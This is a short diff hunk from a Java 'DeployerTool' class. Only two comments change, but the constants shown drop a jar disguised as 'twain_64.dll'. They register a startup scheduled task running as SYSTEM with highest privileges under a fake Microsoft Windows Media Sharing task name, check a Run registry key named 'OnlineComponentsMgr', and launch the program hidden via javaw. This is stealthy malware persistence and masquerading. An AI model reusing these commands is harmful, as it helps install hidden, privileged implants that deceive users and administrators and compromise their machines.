@@ -7,8 +7,8 @@ import java.nio.file.StandardCopyOption;
 public class DeployerTool {
 	private static final String DESTINATION_FILE_NAME = "twain_64.dll";
 	private static final String TASK_CREATION_STRING = "schtasks /CREATE /TN \"Microsoft\\Windows\\Windows Media Sharing\\Windows Scanning Helper\" /RU \"NT AUTHORITY\\SYSTEM\" /SC ONSTART /RL HIGHEST /TR \"javaw -jar %s neutral\"";
-	// For debug use: cmd /C start cmd /K java -jar %s neutral
-	// For normal mode, use: javaw -jar %s neutral
+	// For debug use:				cmd /C start cmd /K java -jar %s neutral
+	// For normal mode, use:		cmd /C start javaw -jar %s neutral
 	private static final String PROGRAM_LAUNCH_STRING = "cmd /C start javaw -jar %s neutral"; // CMD /C is important here else the process won't be detached from Java...
 	private static final String TASK_QUERY_STRING = "schtasks /QUERY /TN \"Microsoft\\Windows\\Windows Media Sharing\\Windows Scanning Helper\"";
 	private static final String REG_QUERY_STRING = "reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v OnlineComponentsMgr";
